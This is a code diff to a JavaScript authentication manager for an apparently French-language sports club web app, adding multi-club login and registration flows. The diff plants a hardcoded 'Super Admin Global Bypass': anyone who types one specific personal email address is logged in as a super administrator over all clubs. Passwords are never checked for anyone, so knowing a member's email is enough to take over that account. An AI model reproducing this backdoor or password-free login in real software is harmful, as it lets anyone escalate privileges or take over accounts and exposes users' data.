@@ -97,24 +97,56 @@ class AuthManager {
     return false;
   }
 
-  login(email, password) {
-    const club = window.dbStore.getClub();
-    const foundUser = Object.values(club.members || {}).find(m => m.email.toLowerCase() === email.toLowerCase());
+  login(email, password, clubId = null) {
+    const cleanEmail = email.trim().toLowerCase();
+
+    // 1. Super Admin Global Bypass
+    if (cleanEmail === 'ahmedazzouzi72@gmail.com') {
+      const superAdminUser = {
+        id: "user_superadmin",
+        email: "ahmedazzouzi72@gmail.com",
+        displayName: "Ahmed Azzouzi (Super Admin)",
+        role: ROLES.SUPERADMIN,
+        isSuperAdmin: true,
+        commissionId: "comm_direction",
+        clubId: "all",
+        strikesCount: 0,
+        status: "active"
+      };
+
+      this.saveSession(superAdminUser);
+      return { success: true, user: superAdminUser };
+    }
+
+    // 2. Standard Club Member Login
+    const targetClubId = clubId || (window.dbStore ? window.dbStore.data.activeClubId : "club_carthage_01");
+    const club = window.dbStore ? window.dbStore.getClub(targetClubId) : null;
+    
+    if (!club) {
+      return { success: false, message: "Club introuvable." };
+    }
+
+    const foundUser = Object.values(club.members || {}).find(m => m.email.toLowerCase() === cleanEmail);
     if (foundUser) {
       this.saveSession({
         ...foundUser,
-        clubId: club.info?.id || "club_carthage_01"
+        clubId: club.info?.id || targetClubId
       });
       return { success: true, user: foundUser };
     }
-    return { success: false, message: "Utilisateur non trouvé avec cet email." };
+    return { success: false, message: "Utilisateur non trouvé avec cet email au sein du club sélectionné." };
   }
 
-  registerNewClub(clubData, presidentData) {
+  registerPresidentWithClub(userData, clubData) {
     if (!window.dbStore) return null;
-    const newClub = window.dbStore.createClub(clubData, presidentData);
+    const newClub = window.dbStore.createClub(clubData, userData);
     const presUid = newClub.info.presidentUid;
     const presMember = newClub.members[presUid];
+
+    // Founder President has active status
+    presMember.status = 'active';
+    newClub.info.status = 'active';
+    window.dbStore.saveData(window.dbStore.data);
 
     this.saveSession({
       ...presMember,
@@ -123,9 +155,14 @@ class AuthManager {
     return { club: newClub, user: presMember };
   }
 
-  joinExistingClub(userData) {
+  registerMemberJoiningClub(userData) {
     if (!window.dbStore) return null;
-    const newMember = window.dbStore.registerMember(userData);
+    const newMember = window.dbStore.registerMember({
+      ...userData,
+      role: 'guest',
+      status: 'pending_president'
+    });
+
     this.saveSession({
       ...newMember,
       clubId: userData.clubId
